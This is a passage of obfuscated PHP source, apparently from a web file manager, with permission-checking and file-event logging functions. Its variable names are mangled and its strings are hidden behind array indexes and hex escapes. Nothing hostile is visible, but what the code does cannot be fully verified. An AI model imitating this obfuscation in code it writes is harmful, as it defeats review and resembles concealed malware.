!$Î…ıü»‚[$ß¶Š£‹Œ]) { continue; } $»óÑå²´ = array(); foreach ($¶û²Ù”É[$ß¶Š£‹Œ] as $ÌÑ„Ä˜) { $»óÑå²´[] = $Î…ıü»‚[$ÌÑ„Ä˜]; } $åÓûÆÓœ[$Î”Éïúù] = array_merge($»óÑå²´, $±‹ª¡ÃÁ); } $ôöèØê© = array_values(array_unique($ôöèØê©)); $ùƒıçñç = array($×‡ùÙç[2069] => $ôöèØê©, $×‡ùÙç[2070] => $åÓûÆÓœ); $õ„¾™áš[$úª›èíÎ] = $ùƒıçñç; return $ùƒıçñç; } private function makeSourceAuth($ú‹¶Üã, $œŒ…Âˆ¯, $ô™½¡‰ = false) { $®’Ÿ¤ =& $_SERVER[…É¦À–]; $ü±ÊÌô½ = $®’Ÿ¤[88]; $ÍÓ§µö = $ú‹¶Üã[$®’Ÿ¤[525]]; $ıˆ»ŸÇ = $ú‹¶Üã[$®’Ÿ¤[440]] == SourceModel::TYPE_GROUP; $ØÎ¤Š‚ = $ıˆ»ŸÇ ? $this->groupRootAuth($ÍÓ§µö, $ô™½¡‰) : !1; if ($ØÎ¤Š‚ && Model($®’Ÿ¤[527])->authCheckAction($ØÎ¤Š‚[$®’Ÿ¤[442]], $®’Ÿ¤[1898])) { return $this->groupAuthInfo($ØÎ¤Š‚, $ÍÓ§µö); } $£Ó¹¿à– = Model($®’Ÿ¤[1378])->parentLevelArray($ú‹¶Üã[$®’Ÿ¤[540]]); $£Ó¹¿à– = array_merge(array($ú‹¶Üã[$®’Ÿ¤[431]]), array_reverse($£Ó¹¿à–)); $¶”’À·ƒ = !1; foreach ($£Ó¹¿à– as $ñİ”á“†) { if (!isset($œŒ…Âˆ¯[$ñİ”á“†])) { continue; } $º¨ñüÁ = $this->authMake($œŒ…Âˆ¯[$ñİ”á“†], $ô™½¡‰); if ($º¨ñüÁ[$®’Ÿ¤[496]]) { $¶”’À·ƒ = $º¨ñüÁ; break; } } if (!$ıˆ»ŸÇ) { return $¶”’À·ƒ; } if (!$¶”’À·ƒ && $ØÎ¤Š‚) { $¶”’À·ƒ = $this->groupAuthInfo($ØÎ¤Š‚, $ÍÓ§µö); } if (!$¶”’À·ƒ) { $¨±ÒÏ‹ = Model($®’Ÿ¤[541])->getInfo($ÍÓ§µö); $•ÖÁƒ·€ = explode($®’Ÿ¤[50], trim($¨±ÒÏ‹[$®’Ÿ¤[540]], $®’Ÿ¤[50])); $•ÖÁƒ·€ = array_reverse($•ÖÁƒ·€); foreach ($•ÖÁƒ·€ as $Öö‰êÀˆ) { if ($Öö‰êÀˆ == $®’Ÿ¤[198] || $Öö‰êÀˆ == $ü±ÊÌô½) { continue; } $½ï«òşÔ = $this->groupRootAuth($Öö‰êÀˆ, $ô™½¡‰); if (!$½ï«òşÔ) { continue; } $¶”’À·ƒ = $this->groupAuthInfo($½ï«òşÔ, $Öö‰êÀˆ); break; } } if (!$¶”’À·ƒ || $¶”’À·ƒ[$®’Ÿ¤[443]] <= 0) { $¹ğ¯ä„ = $this->authDeepCheck($ú‹¶Üã[$®’Ÿ¤[431]], $ô™½¡‰); if ($¹ğ¯ä„) { $¶”’À·ƒ = $¹ğ¯ä„; } } return $¶”’À·ƒ; } private function userIsRoot($ÔüÓµÚ = false) { $é…¯õ›‰ =& $_SERVER[…É¦À–]; if (!$ÔüÓµÚ && _get($GLOBALS, $é…¯õ›‰[523])) { return !0; } $™®Üå™Ô = Model($é…¯õ›‰[554])->getInfo($ÔüÓµÚ); $¾§ƒø–· = Model($é…¯õ›‰[2078])->listData($™®Üå™Ô[$é…¯õ›‰[1565]]); if ($¾§ƒø–· && $¾§ƒø–·[$é…¯õ›‰[531]][$é…¯õ›‰[2079]] == 1) { return !0; } return !1; } private function sourceAuthInfo($Ø–ã™µ±) { $Ò¶Ê‘şÒ =& $_SERVER[…É¦À–]; $•üáÎÌ© = Model($Ò¶Ê‘şÒ[1378]); $ëóËü = $•üáÎÌ©->sourceInfo($Ø–ã™µ±); if (!$ëóËü) { return !1; } $•üáÎÌ©->groupPathDisplay($ëóËü); $„±Šæ„ = array($ëóËü); $„±Šæ„ = $•üáÎÌ©->_listAppendPath($„±Šæ„); $ëóËü = $„±Šæ„[0]; $œÀşİÇê = $ëóËü[$Ò¶Ê‘şÒ[538]]; if (isset($ëóËü[$Ò¶Ê‘şÒ[546]])) { $ø­ë«ö = explode($Ò¶Ê‘şÒ[8], trim($ëóËü[$Ò¶Ê‘şÒ[538]], $Ò¶Ê‘şÒ[8])); array_shift($ø­ë«ö); $œÀşİÇê = $ëóËü[$Ò¶Ê‘şÒ[544]] . $Ò¶Ê‘şÒ[2080] . implode($Ò¶Ê‘şÒ[8], $ø­ë«ö); } return array($Ò¶Ê‘şÒ[449] => $ëóËü[$Ò¶Ê‘şÒ[32]], $Ò¶Ê‘şÒ[84] => KodIO::make($ëóËü[$Ò¶Ê‘şÒ[431]]), $Ò¶Ê‘şÒ[2081] => $œÀşİÇê); } private function groupAuthInfo($Á³Äüúõ, $Å¼Ùõäû) { $±çûÑ£­ =& $_SERVER[…É¦À–]; $ªğ¼Õ¼‘ = Model($±çûÑ£­[541])->getInfo($Å¼Ùõäû); return array($±çûÑ£­[2082] => intval($Á³Äüúõ[$±çûÑ£­[442]]), $±çûÑ£­[2066] => $Á³Äüúõ, $±çûÑ£­[2083] => LNG($±çûÑ£­[2084]), $±çûÑ£­[2075] => array($±çûÑ£­[449] => $ªğ¼Õ¼‘[$±çûÑ£­[32]], $±çûÑ£­[84] => KodIO::make($ªğ¼Õ¼‘[$±çûÑ£­[87]][$±çûÑ£­[431]]), $±çûÑ£­[2081] => $ªğ¼Õ¼‘[$±çûÑ£­[545]])); } protected function groupRootAuth($‚è¥Ò÷Î, $¤»ÑÌ—Î = false) { $æŸª³€ =& $_SERVER[…É¦À–]; $¤»ÑÌ—Î = $¤»ÑÌ—Î ? $¤»ÑÌ—Î : USER_ID; $íº¿¡æø = $¤»ÑÌ—Î . $æŸª³€[2085] . $‚è¥Ò÷Î; static $Š…ö©Ã = array(); if (isset($Š…ö©Ã[$íº¿¡æø])) { return $Š…ö©Ã[$íº¿¡æø]; } $ª³’ù€Ñ = Model($æŸª³€[541])->getInfo($‚è¥Ò÷Î); $ƒŞˆòØø = $this->userGroupList($¤»ÑÌ—Î); $šÖ€”ßç = isset($ƒŞˆòØø[$‚è¥Ò÷Î]) ? $ƒŞˆòØø[$‚è¥Ò÷Î][$æŸª³€[442]] : !1; if ($šÖ€”ßç && Model($æŸª³€[527])->authCheckAction($šÖ€”ßç[$æŸª³€[442]], $æŸª³€[1898])) { $Š…ö©Ã[$íº¿¡æø] = $šÖ€”ßç; return $šÖ€”ßç; } $·®â ğı = $this->sourceAuthSelect($ª³’ù€Ñ[$æŸª³€[87]][$æŸª³€[431]]); $‰÷×£« = $·®â ğı ? $this->authMake($·®â ğı, $¤»ÑÌ—Î) : !1; $Ö£ÔŒ = $‰÷×£« ? $‰÷×£«[$æŸª³€[496]] : !1; $Š…ö©Ã[$íº¿¡æø] = $Ö£ÔŒ ? $Ö£ÔŒ : $šÖ€”ßç; return $Š…ö©Ã[$íº¿¡æø]; } public function authOwnerApply($…ŞšÄ˜) { $ñËŠ°æ =& $_SERVER[…É¦À–]; if (empty($…ŞšÄ˜[$ñËŠ°æ[442]]) || isset($…ŞšÄ˜[$ñËŠ°æ[2086]]) && $…ŞšÄ˜[$ñËŠ°æ[2086]]) { return $…ŞšÄ˜; } if (AuthModel::authCheckRoot($…ŞšÄ˜[$ñËŠ°æ[442]][$ñËŠ°æ[443]])) { return $…ŞšÄ˜; } $¸¹•‘ö = Model($ñËŠ°æ[1378])->parentLevelArray($…ŞšÄ˜[$ñËŠ°æ[540]]); $¸¹•‘ö = array_merge(array($…ŞšÄ˜[$ñËŠ°æ[431]]), array_reverse($¸¹•‘ö)); $ğ„¿²ì” = $this->sourceAuthSelect($¸¹•‘ö); $·ÙáÕ• = array(); $ÅÊ©¾³ = array(); foreach ($ğ„¿²ì” as $œûÌ“ª¤ => $º¹‹¤Õì) { $¸Ô…Ìì‡ = $this->authFolderOwnerUser($º¹‹¤Õì); $·ÙáÕ•[$œûÌ“ª¤] = $¸Ô…Ìì‡; $ÅÊ©¾³ = array_merge($ÅÊ©¾³, $¸Ô…Ìì‡[$ñËŠ°æ[619]]); if ($¸Ô…Ìì‡[$ñËŠ°æ[2087]]) { break; } } if (count($ÅÊ©¾³) == 0) { $ÅÊ©¾³ = $this->authFolderOwnerGroup($…ŞšÄ˜[$ñËŠ°æ[525]]); } $ÅÊ©¾³ = array_unique($ÅÊ©¾³); if (AuthModel::authCheckRoot($…ŞšÄ˜[$ñËŠ°æ[442]][$ñËŠ°æ[443]])) { $ÅÊ©¾³[] = USER_ID; } $…ŞšÄ˜[$ñËŠ°æ[442]][$ñËŠ°æ[2088]] = Model($ñËŠ°æ[533])->userListInfo($ÅÊ©¾³); return $…ŞšÄ˜; } private function authFolderOwnerGroup($Õòî¿ƒ­) { $åş¾Á×Á =& $_SERVER[…É¦À–]; $Å¦ÑĞ‹İ = Model($åş¾Á×Á[1967])->where(array($åş¾Á×Á[1877] => $Õòî¿ƒ­))->select(); $™Úí³³¦ = array(); if (!$Å¦ÑĞ‹İ) { return $™Úí³³¦; } foreach ($Å¦ÑĞ‹İ as $Ş–éöä‚) { $Ú÷ãÏ–Æ = $this->authInfo($Ş–éöä‚); if (AuthModel::authCheckRoot($Ú÷ãÏ–Æ[$åş¾Á×Á[442]])) { $™Úí³³¦[] = $Ş–éöä‚[$åş¾Á×Á[1687]]; } } return $™Úí³³¦; } private function authFolderOwnerUser($ó‚‹•¿Õ) { $á‡òªÃ÷ =& $_SERVER[…É¦À–]; $Œ˜§ÜŸ = array(); $Æ‘Ìéõ³ = !1; foreach ($ó‚‹•¿Õ as $àÁÌ¨Ûö) { $ïÇÚÆîõ = $this->authInfo($àÁÌ¨Ûö); if ($àÁÌ¨Ûö[$á‡òªÃ÷[525]] == $á‡òªÃ÷[198]) { $Æ‘Ìéõ³ = !0; } if ($àÁÌ¨Ûö[$á‡òªÃ÷[440]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($ïÇÚÆîõ[$á‡òªÃ÷[442]])) { $Œ˜§ÜŸ[] = $àÁÌ¨Ûö[$á‡òªÃ÷[525]]; } } } return array($á‡òªÃ÷[619] => $Œ˜§ÜŸ, $á‡òªÃ÷[2087] => $Æ‘Ìéõ³); } public function authMake($ªÃãüâ, $Òå¸Ñ®å = false) { $Áš…›õ =& $_SERVER[…É¦À–]; $Ê˜òÌŒë = $this->authArrayCheck($ªÃãüâ, $Òå¸Ñ®å); if ($Ê˜òÌŒë[$Áš…›õ[2089]]) { $Ê˜òÌŒë[$Áš…›õ[2089]] = $this->sourceAuthInfo($Ê˜òÌŒë[$Áš…›õ[2089]]); } return $Ê˜òÌŒë; } public function authArrayCheck($´©š½Ÿ, $À«ªéØ = false) { $¬Åƒ¶ =& $_SERVER[…É¦À–]; if (!$´©š½Ÿ) { return array($¬Åƒ¶[443] => 0, $¬Åƒ¶[496] => !1); } $À«ªéØ = $À«ªéØ ? $À«ªéØ : USER_ID; $åœ¢¡ö¹ = 0; $ÙÕ¼È¥É = 0; $¥íøêÛ¹ = 0; $•²ÕÌÀÔ = 0; $û·Şùµ• = 0; $±¿šùÀ = 0; $ƒœ¥£À¾ = 1000; $ÍÙÇé¿… = 0; $šêÀ¡§ = 0; $êæŠÒ„é = 0; $—óŒôğÃ = 0; $’Æ©¢‰ù = array($¬Åƒ¶[431] => 0); foreach ($´©š½Ÿ as $’Æ©¢‰ù) { $¤¹×şÑí = $this->authInfo($’Æ©¢‰ù); if (!$¤¹×şÑí) { continue; } $•­›¸å€ = $’Æ©¢‰ù[$¬Åƒ¶[525]]; $ÈÅ£´œï = intval($¤¹×şÑí[$¬Åƒ¶[442]]); if ($’Æ©¢‰ù[$¬Åƒ¶[440]] == SourceModel::TYPE_USER && $•­›¸å€ == $À«ªéØ) { $åœ¢¡ö¹ = !0; $¥íøêÛ¹ = $¤¹×şÑí; $ÙÕ¼È¥É = $ÈÅ£´œï; } else { if ($’Æ©¢‰ù[$¬Åƒ¶[440]] == SourceModel::TYPE_GROUP && $this->groupContainUser($•­›¸å€, $À«ªéØ)) { $•²ÕÌÀÔ = !0; $æ¨«µŸ = $this->groupStepToUserGroup($•­›¸å€, $À«ªéØ); if ($æ¨«µŸ < $ƒœ¥£À¾) { $ƒœ¥£À¾ = $æ¨«µŸ; $û·Şùµ• = $ÈÅ£´œï; $±¿šùÀ = $¤¹×şÑí; $ÍÙÇé¿… = $•­›¸å€; } if ($æ¨«µŸ == $ƒœ¥£À¾ && $ÈÅ£´œï >= $û·Şùµ•) { $û·Şùµ• = $ÈÅ£´œï; $±¿šùÀ = $¤¹×şÑí; $ÍÙÇé¿… = $•­›¸å€; } } else { if ($•­›¸å€ == $¬Åƒ¶[198]) { $šêÀ¡§ = !0; $—óŒôğÃ = $¤¹×şÑí; $êæŠÒ„é = $ÈÅ£´œï; } } } } if ($åœ¢¡ö¹) { $Ë­¿Áßª = $ÙÕ¼È¥É; $¤¹×şÑí = $¥íøêÛ¹; $½—‚¡Ö­ = LNG($¬Åƒ¶[2090]); } else { if ($•²ÕÌÀÔ) { $Ë­¿Áßª = $û·Şùµ•; $¤¹×şÑí = $±¿šùÀ; $Ìı—±“À = Model($¬Åƒ¶[541])->getInfo($ÍÙÇé¿…); $½—‚¡Ö­ = $¬Åƒ¶[162] . $Ìı—±“À[$¬Åƒ¶[545]] . $¬Åƒ¶[2091] . LNG($¬Åƒ¶[2092]); } else { if ($šêÀ¡§) { $Ë­¿Áßª = $êæŠÒ„é; $¤¹×şÑí = $—óŒôğÃ; $½—‚¡Ö­ = LNG($¬Åƒ¶[2063]); } else { $Ë­¿Áßª = 0; $¤¹×şÑí = !1; $½—‚¡Ö­ = $¬Åƒ¶[12]; } } } $†—Îñİ³ = array($¬Åƒ¶[2082] => intval($Ë­¿Áßª), $¬Åƒ¶[2066] => $¤¹×şÑí, $¬Åƒ¶[2083] => $½—‚¡Ö­, $¬Åƒ¶[2075] => $’Æ©¢‰ù[$¬Åƒ¶[431]]); return $†—Îñİ³; } private function groupContainUser($ì‰İáß”, $âªàİ» = false) { return in_array($ì‰İáß”, $this->userGroupParents($âªàİ»)); } private function groupStepToUserGroup($áÃÃ•Ÿù, $¯˜Ò¦ŒÅ = false) { $îûœ¸›„ =& $_SERVER[…É¦À–]; $Ö­‘ ã¾ = $this->userGroupList($¯˜Ò¦ŒÅ); $“Àèïê¯ = 1000; $×ä—ù®¥ = $GLOBALS[$îûœ¸›„[6]][$îûœ¸›„[89]][$îûœ¸›„[1980]] == 1; $»Ù•š· = $×ä—ù®¥ ? 3 : 2; foreach ($Ö­‘ ã¾ as $é±Ğ—§×) { if ($é±Ğ—§×[$îûœ¸›„[1877]] == $áÃÃ•Ÿù) { return 0; } $¹ïŞñîÛ = explode($îûœ¸›„[50], trim($é±Ğ—§×[$îûœ¸›„[540]], $îûœ¸›„[50])); if ($¹ïŞñîÛ[0] == $îûœ¸›„[198] && count($¹ïŞñîÛ) > $»Ù•š·) { $Ÿš£›ø = array_reverse(array_slice($¹ïŞñîÛ, $»Ù•š·)); $Á‚¶à¶ = array_search($áÃÃ•Ÿù, $Ÿš£›ø); if ($Á‚¶à¶ !== !1 && $Á‚¶à¶ + 1 <= $“Àèïê¯) { $“Àèïê¯ = $Á‚¶à¶ + 1; } } } return $“Àèïê¯; } private function userGroupList($¶¡ÓÁ¼õ = false) { $Õì¯ı›Ø =& $_SERVER[…É¦À–]; static $••»ñşµ = array(); if (isset($••»ñşµ[$¶¡ÓÁ¼õ])) { return $••»ñşµ[$¶¡ÓÁ¼õ]; } $’óìƒÙ = Model($Õì¯ı›Ø[554])->getInfo($¶¡ÓÁ¼õ); $••»ñşµ[$¶¡ÓÁ¼õ] = array_to_keyvalue($’óìƒÙ[$Õì¯ı›Ø[2064]], $Õì¯ı›Ø[1877]); return $••»ñşµ[$¶¡ÓÁ¼õ]; } public function userGroupParents($ÊÑ×Œ©¶) { $»£ËŒà =& $_SERVER[…É¦À–]; static $š§®÷‘æ = array(); $ÊÑ×Œ©¶ = $ÊÑ×Œ©¶ ? $ÊÑ×Œ©¶ : USER_ID; if (isset($š§®÷‘æ[$ÊÑ×Œ©¶])) { return $š§®÷‘æ[$ÊÑ×Œ©¶]; } $ş£´¼·è = $this->userGroupList($ÊÑ×Œ©¶); $îÙãÓÛì = array(); $‚±‡¦ª™ = $GLOBALS[$»£ËŒà[6]][$»£ËŒà[89]][$»£ËŒà[1980]] == 1; $¢„ÓÚŞ = $‚±‡¦ª™ ? 3 : 2; foreach ($ş£´¼·è as $¯ ÇÚ†Ù) { $€ãÑ”Œ = array($¯ ÇÚ†Ù[$»£ËŒà[1877]]); $ÂìŒğçÈ = explode($»£ËŒà[50], trim($¯ ÇÚ†Ù[$»£ËŒà[540]], $»£ËŒà[50])); if ($ÂìŒğçÈ[0] == $»£ËŒà[198] && count($ÂìŒğçÈ) > $¢„ÓÚŞ) { $‰î¾ñ²ë = array_slice($ÂìŒğçÈ, $¢„ÓÚŞ); $€ãÑ”Œ = array_merge($€ãÑ”Œ, array_reverse($‰î¾ñ²ë)); } $îÙãÓÛì = array_merge($îÙãÓÛì, $€ãÑ”Œ); } $š§®÷‘æ[$ÊÑ×Œ©¶] = array_unique($îÙãÓÛì); return $š§®÷‘æ[$ÊÑ×Œ©¶]; } public function authTargetInfoMake($ëÇ¼•£é) { $½ÃÊ¤Ç¶ =& $_SERVER[…É¦À–]; $óü½•ÁŒ = array(); $è«§Õ§ = array(); foreach ($ëÇ¼•£é as $›»ƒÌ Ğ) { if ($›»ƒÌ Ğ[$½ÃÊ¤Ç¶[440]] == SourceModel::TYPE_USER) { $óü½•ÁŒ[] = intval($›»ƒÌ Ğ[$½ÃÊ¤Ç¶[525]]); } else { if ($›»ƒÌ Ğ[$½ÃÊ¤Ç¶[440]] == SourceModel::TYPE_GROUP) { $è«§Õ§[] = intval($›»ƒÌ Ğ[$½ÃÊ¤Ç¶[525]]); } } } if ($óü½•ÁŒ) { $óü½•ÁŒ = Model($½ÃÊ¤Ç¶[533])->userListInfo($óü½•ÁŒ); } if ($è«§Õ§) { $ÇÒ­ß¢ë = array($½ÃÊ¤Ç¶[1965] => array($½ÃÊ¤Ç¶[447], $è«§Õ§)); $è«§Õ§ = Model($½ÃÊ¤Ç¶[541])->field($½ÃÊ¤Ç¶[2093])->where($ÇÒ­ß¢ë)->select(); $è«§Õ§ = array_to_keyvalue($è«§Õ§, $½ÃÊ¤Ç¶[1877]); } return array($½ÃÊ¤Ç¶[2094] => $óü½•ÁŒ, $½ÃÊ¤Ç¶[2095] => $è«§Õ§); } public function authInfo($æãŠşØ) { $§ü´„İ =& $_SERVER[…É¦À–]; if ($æãŠşØ[$§ü´„İ[1981]]) { $¾Ù–ü = Model($§ü´„İ[527])->listData($æãŠşØ[$§ü´„İ[1981]]); if (!$¾Ù–ü) { return !1; $Œ‚ÀåÄŸ = Model($§ü´„İ[527])->listData(); $ÑÓÇ‡ú = array_filter_by_field($Œ‚ÀåÄŸ, $§ü´„İ[442], $§ü´„İ[198]); return $ÑÓÇ‡ú; } $‚´¡Ùş… = array_field_key($¾Ù–ü, array($§ü´„İ[428], $§ü´„İ[32], $§ü´„İ[442], $§ü´„İ[1900], $§ü´„İ[1901])); $‚´¡Ùş…[$§ü´„İ[2096]] = $æãŠşØ; return $‚´¡Ùş…; } else { return array($§ü´„İ[448] => 0, $§ü´„İ[1883] => $æãŠşØ[$§ü´„İ[2041]], $§ü´„İ[449] => $§ü´„İ[12], $§ü´„İ[1900] => $§ü´„İ[2097]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\x69\x6f\137\x73\x6f\x75\x72\x63\x65\137\x65\x76\145\x6e\164"; protected $dataAuto = array(array("\143\x72\145\x61\x74\145\x54\x69\155\145", "\x74\151\155\x65", "\x69\x6e\x73\145\162\x74", "\x66\x75\156\143\164\151\x6f\156"), array("\x64\145\x73\x63", '', "\151\156\163\x65\x72\164\54\x75\x70\144\x61\x74\x65\x2c\x73\x65\x6c\x65\143\x74", "\152\x73\157\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($‡•¼áÓÙ, $Ş†ôÜµ, $‰Ñâªó÷ = '') { $“Ùš»²¼ =& $_SERVER[…É¦À–]; if (!$this->eventSave) { return; } $òùÇš”¸ = Model($“Ùš»²¼[1378])->sourceInfo($‡•¼áÓÙ); if (!$òùÇš”¸) { return !1; } if ($this->isCacheEvent($òùÇš”¸, $Ş†ôÜµ)) { return; } if ($‰Ñâªó÷ && is_string($‰Ñâªó÷)) { $‰Ñâªó÷ = array($“Ùš»²¼[1916] => $‰Ñâªó÷); } $¼Ô†÷ = defined($“Ùš»²¼[2098]) ? USER_ID : 0; $áøé¢ıı = array($“Ùš»²¼[446] => $‡•¼áÓÙ, $“Ùš»²¼[2099] => $òùÇš”¸[$“Ùš»²¼[461]], $“Ùš»²¼[2100] => $òùÇš”¸[$“Ùš»²¼[32]], $“Ùš»²¼[538] => !empty($òùÇš”¸[$“Ùš»²¼[538]]) ? $òùÇš”¸[$“Ùš»²¼[538]] : $“Ùš»²¼[12], $“Ùš»²¼[1678] => $¼Ô†÷, $“Ùš»²¼[451] => $Ş†ôÜµ, $“Ùš»²¼[1680] => $‰Ñâªó÷); $this->addSystemLog($Ş†ôÜµ, $áøé¢ıı); unset($áøé¢ıı[$“Ùš»²¼[2100]], $áøé¢ıı[$“Ùš»²¼[538]]); return $this->add($áøé¢ıı); } private function addSystemLog($å·Á×Ëé, $ƒ¼¯§¿à) { $ºÇàúÂ =& $_SERVER[…É¦À–]; if ($å·Á×Ëé == $ºÇàúÂ[2101]) { $å·Á×Ëé = $ƒ¼¯§¿à[$ºÇàúÂ[482]][$ºÇàúÂ[2102]]; } else { if (in_array($å·Á×Ëé, array($ºÇàúÂ[1857], $ºÇàúÂ[2103]))) { $å·Á×Ëé = $ƒ¼¯§¿à[$ºÇàúÂ[482]][$ºÇàúÂ[794]]; } } $È´¢ô = array_merge($ƒ¼¯§¿à, array($ºÇàúÂ[2104] => $ƒ¼¯§¿à[$ºÇàúÂ[431]], $ºÇàúÂ[2105] => $ƒ¼¯§¿à[$ºÇàúÂ[2105]])); Hook::trigger($ºÇàúÂ[2106], $ºÇàúÂ[2107] . $å·Á×Ëé, $ƒ¼¯§¿à); Model($ºÇàúÂ[1821])->addLog($ºÇàúÂ[2107] . $å·Á×Ëé, $È´¢ô); } private function isCacheEvent($±Í¹¾¡Ï, $‰‰¡êĞ‡) { if ($±Í¹¾¡Ï[$_SERVER[…É¦À–][440]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($¨È¥Ã£İ, $ÒÂ„ÔÖ’) { $ÉŠƒôÕî =& $_SERVER[…É¦À–]; $™‰×œÎ˜ = Model($ÉŠƒôÕî[1378])->sourceInfo($¨È¥Ã£İ); $°‚¹í = array($ÉŠƒôÕî[2102] => $ÒÂ„ÔÖ’, $ÉŠƒôÕî[32] => $™‰×œÎ˜[$ÉŠƒôÕî[32]]); return $this->addEvent($¨È¥Ã£İ, $ÉŠƒôÕî[2101], $°‚¹í); } public function eventFileEdit($Û £ÜâÅ) { $ñóÏË‘ =& $_SERVER[…É¦À–]; $‹ Ñğ†´ = array($ñóÏË‘[2108] => $_SERVER[$ñóÏË‘[2109]], $ñóÏË‘[2110] => strtolower(ACTION)); if (isset($GLOBALS[$ñóÏË‘[7]][$ñóÏË‘[2111]])) { $‹ Ñğ†´[$ñóÏË‘[2111]] = $ñóÏË‘[88]; } return $this->addEvent($Û £ÜâÅ, $ñóÏË‘[1847], $‹ Ñğ†´); } public function eventRecycle($Œ…€ÒÄŸ, $×­¬×€ù) { return $this->addEvent($Œ…€ÒÄŸ, $_SERVER[…É¦À–][2103], $×­¬×€ù); } public function eventRemove($ „Ğ’èù) { $“•ùñşì =& $_SERVER[…É¦À–]; $İÈ¸¥‡ä = Model($“•ùñşì[1378])->sourceInfo($ „Ğ’èù); $ê®¤´ = $İÈ¸¥‡ä[$“•ùñşì[32]]; return $this->addEvent($İÈ¸¥‡ä[$“•ùñşì[461]], $“•ùñşì[1846], $ê®¤´); } public function eventShare($½¨ìõ£Ê, $ÆÙ‰´¼¸) { return $this->addEvent($½¨ìõ£Ê, $_SERVER[…É¦À–][1857], $ÆÙ‰´¼¸); } public function eventMove($¯şÚïµ“, $­‚õ³•á, $¡‘©Ú©ù) { $Ù‡éÇÛ« =& $_SERVER[…É¦À–]; $—¦ˆÕ¢Ø = Model($Ù‡éÇÛ«[1378]); $ŞÒêë¹ä = $—¦ˆÕ¢Ø->sourceInfo($¯şÚïµ“); $•µ Ñ× = $—¦ˆÕ¢Ø->sourceInfo($­‚õ³•á); $ä„û”ŞÚ = $—¦ˆÕ¢Ø->sourceInfo($¡‘©Ú©ù); $ô•’şÌÚ = array($Ù‡éÇÛ«[1205] => $­‚õ³•á, $Ù‡éÇÛ«[2112] => $•µ Ñ×[$Ù‡éÇÛ«[32]], $Ù‡éÇÛ«[2089] => !empty($•µ Ñ×[$Ù‡éÇÛ«[538]]) ? $•µ Ñ×[$Ù‡éÇÛ«[538]] : $Ù‡éÇÛ«[12], $Ù‡éÇÛ«[1206] => $¡‘©Ú©ù, $Ù‡éÇÛ«[2113] => $ä„û”ŞÚ[$Ù‡éÇÛ«[32]], $Ù‡éÇÛ«[2114] => !empty($ä„û”ŞÚ[$Ù‡éÇÛ«[538]]) ? $ä„û”ŞÚ[$Ù‡éÇÛ«[538]] : $Ù‡éÇÛ«[12]); $this->addEvent($¯şÚïµ“, $Ù‡éÇÛ«[577], $ô•’şÌÚ); $ŞÒêë¹ä = $—¦ˆÕ¢Ø->sourceInfo($¯şÚïµ“); $ô•’şÌÚ = array($Ù‡éÇÛ«[431] => $ŞÒêë¹ä[$Ù‡éÇÛ«[431]], $Ù‡éÇÛ«[32] => $ŞÒêë¹ä[$Ù‡éÇÛ«[32]]); $this->addEvent($­‚õ³•á, $Ù‡éÇÛ«[2115], $ô•’şÌÚ); } public function eventCopy($šØƒÄ±­) { $this->eventCreate($šØƒÄ±­, $_SERVER[…É¦À–][575]); } public function eventRename($ı†æåâÆ, $—”Ö±’£, $¿¨â—ö¯) { $›ÍÔÂùæ =& $_SERVER[…É¦À–]; $ú·û÷Ş” = array($›ÍÔÂùæ[1205] => $—”Ö±’£, $›ÍÔÂùæ[1206] => $¿¨â—ö¯); return $this->addEvent($ı†æåâÆ, $›ÍÔÂùæ[1393], $ú·û÷Ş”); } public function eventAddComment($ó¯ÁÕÌ“, $ïàÉ—Áµ) { return $this->addEvent($ó¯ÁÕÌ“, $_SERVER[…É¦À–][2116], $ïàÉ—Áµ); } public function eventAddDesc($›¬ñ›Ä“, $ã†Å›Ô) { return $this->addEvent($›¬ñ›Ä“, $_SERVER[…É¦À–][2117], $ã†Å›Ô); } public function listBySource($ÙÒ—³ùØ) { $ÒúšŒ˜Ö =& $_SERVER[…É¦À–]; $¼†÷€ãÉ = Model($ÒúšŒ˜Ö[1378])->sourceInfo($ÙÒ—³ùØ); $ª´À¢½– = array($ÒúšŒ˜Ö[446] => $ÙÒ—³ùØ); if ($¼†÷€ãÉ[$ÒúšŒ˜Ö[439]] == $ÒúšŒ˜Ö[88]) { $œĞÂüÑï = Model($ÒúšŒ˜Ö[1378])->listSearchChildren($ÙÒ—³ùØ, 20000); $œĞÂüÑï[] = $ÙÒ—³ùØ . $ÒúšŒ˜Ö[407]; $ª´À¢½– = array($ÒúšŒ˜Ö[431] => array($ÒúšŒ˜Ö[7], $œĞÂüÑï)); } $æ›°ğ±ˆ = $this->where($ª´À¢½–)->order($ÒúšŒ˜Ö[2118])->selectPage(); if ($æ›°ğ±ˆ[$ÒúšŒ˜Ö[395]][$ÒúšŒ˜Ö[396]] == 0) { $æ›°ğ±ˆ[$ÒúšŒ˜Ö[395]][$ÒúšŒ˜Ö[396]] = 1; $æ›°ğ±ˆ[$ÒúšŒ˜Ö[398]] = array(array($ÒúšŒ˜Ö[446] => $ÙÒ—³ùØ, $ÒúšŒ˜Ö[2099] => $¼†÷€ãÉ[$ÒúšŒ˜Ö[461]], $ÒúšŒ˜Ö[1678] => $¼†÷€ãÉ[$ÒúšŒ˜Ö[483]], $ÒúšŒ˜Ö[451] => $ÒúšŒ˜Ö[2119], $ÒúšŒ˜Ö[452] => $¼†÷€ãÉ[$ÒúšŒ˜Ö[201]], $ÒúšŒ˜Ö[1680] => $ÒúšŒ˜Ö[12])); } return $this->eventListParse($æ›°ğ±ˆ, $ÙÒ—³ùØ); } private function eventListParse($á‡“…ÚÇ, $Õ½²¶ÃÂ) { $Ş İ´§¶ =& $_SERVER[…É¦À–]; $©ó…•® = $á‡“…ÚÇ[$Ş İ´§¶[398]]; $ÅÊÓ†Óª = array_to_keyvalue($©ó…•®, $Ş İ´§¶[12], $Ş İ´§¶[431]); $ğ§¶™¹ƒ = array_to_keyvalue($©ó…•®, $Ş İ´§¶[12], $Ş İ´§¶[2105]); foreach ($©ó…•® as $‰¸İˆ ) { $µÏùÍ¾› = $‰¸İˆ [$Ş İ´§¶[482]]; if ($‰¸İˆ [$Ş İ´§¶[33]] == $Ş İ´§¶[577] && isset($µÏùÍ¾›[$Ş İ´§¶[1205]])) { $ÅÊÓ†Óª[] = $µÏùÍ¾›[$Ş İ´§¶[1205]] . $Ş İ´§¶[12]; $ÅÊÓ†Óª[] = $µÏùÍ¾›[$Ş İ´§¶[1206]] . $Ş 